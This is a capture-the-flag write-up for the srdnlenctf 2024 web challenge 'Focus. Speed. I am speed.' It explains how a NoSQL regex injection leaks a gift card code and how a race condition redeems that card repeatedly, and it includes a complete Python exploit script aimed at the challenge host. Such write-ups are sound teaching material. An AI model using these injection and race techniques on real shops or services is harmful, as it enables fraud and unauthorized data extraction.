# srdnlenctf 2024

## Focus. Speed. I am speed. (X solves)

Welcome to Radiator Springs' finest store, where every car enthusiast's dream comes true! But remember, in the world of racing, precision matters—so tread carefully as you navigate this high-octane experience. Ka-chow!


### Solution

In this challenge, the objective is to exploit a **NoSQL Injection** vulnerability and a **Race Condition** to obtain the flag. The flag is embedded in the product named **"Lightning McQueen's Secret Text"**, priced at 50 points. Points can be accumulated by redeeming daily gift cards, which are vulnerable to exploitation.

---

#### Step 1: NoSQL Injection to Leak Gift Card Codes

The `/redeem` endpoint is vulnerable to **NoSQL Injection**, allowing the exfiltration of valid gift card codes. By crafting a malicious query parameter, you can differentiate between valid and invalid gift card codes based on the server's responses. 

Specifically, the parameter `?discountCode[$regex]=^` can be used to perform a **regex-based injection**, leveraging the server's response patterns:

- **Response 1:** `"You have already redeemed your gift card today"` indicates a valid gift card code.
- **Response 2:** `"Error redeeming gift card"` indicates an invalid or non-existent code.

This distinction enables iterative brute-forcing or character-by-character reconstruction of the full gift card code.

---

#### Step 2: Exploiting Race Condition for Points Duplication

Once a valid gift card code is obtained, a **Race Condition** can be exploited on the `/redeem` endpoint to redeem the same gift card multiple times simultaneously. This is achieved by sending concurrent requests before the backend can update the gift card's redemption status.

##### Attack Implementation

1. **Tools:** Use Burp Suite's Turbo Intruder or a race condition exploitation tool such as RequestsRacer.
2. **Approach:** Implement a **Last Byte Sync (LBS)** strategy, where overlapping requests are sent with minimal delays to maximize the chances of simultaneous execution.

---

#### Step 3: Purchasing the Flag Product

Once at least 50 points are acquired using the Race Condition exploit, navigate to the **store page** and purchase the product titled **"Lightning McQueen's Secret Text"** to retrieve the flag.

---

### Exploit

```python
#!/bin/env python3

from requests import Session
from string import ascii_letters, digits
from random import random
from requests_racer import SynchronizedSession

host = "http://speed.srdnlen.challs.it:80"

nosqli_path = "/redeem?discountCode[$regex]=^"
race_path = "/redeem"
path_register = "/register-user"
path_buy = "/store"
gift_card = ""
flag = ""

alphabet = ascii_letters + digits

# Function to register a user
def register_user(session, username, password):
    r = session.post(f'{host}{path_register}', json={'username': username, 'password': password})

def buy_flag(session):
    r = session.post(f'{host}{path_buy}', json={'productId': 4})
    response_json = r.json()  # Parse the JSON response
    flag = response_json.get("product", {}).get("FLAG", "FLAG not found")  # Safely get the FLAG value
    print(flag)


# Create a session
session = Session()

# Register a user
register_user(session, random(), 'srdnlen')

# Extract and print session cookies
cookies = session.cookies.get_dict()

# Main loop to discover the gift card code
while not flag.endswith("}"):
    if len(gift_card) == 12:
        break

    for c in alphabet:
        response = session.get(f"{host}{nosqli_path}{gift_card}{c}")
        if "Invalid discount code!" not in response.text:
            gift_card += c
            break  # Exit the loop when a match is found

#print(f"Discovered gift card: {gift_card}")

session.close()

# Create a session
session = Session()

# Register a user
register_user(session, random(), 'srdnlen')

# Extract and print session cookies
cookies = session.cookies.get_dict()

jwt_token = cookies.get('jwt', '')  # Default to empty string if 'jwt' is not found

headers = {
    "cookie": f"jwt={jwt_token}"  # Embeds the value of jwt_token
}

s = SynchronizedSession()

resp1 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp2 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp3 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp4 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp5 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp6 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp7 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp8 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp10 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp9 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)


s.finish_all()

buy_flag(session)

```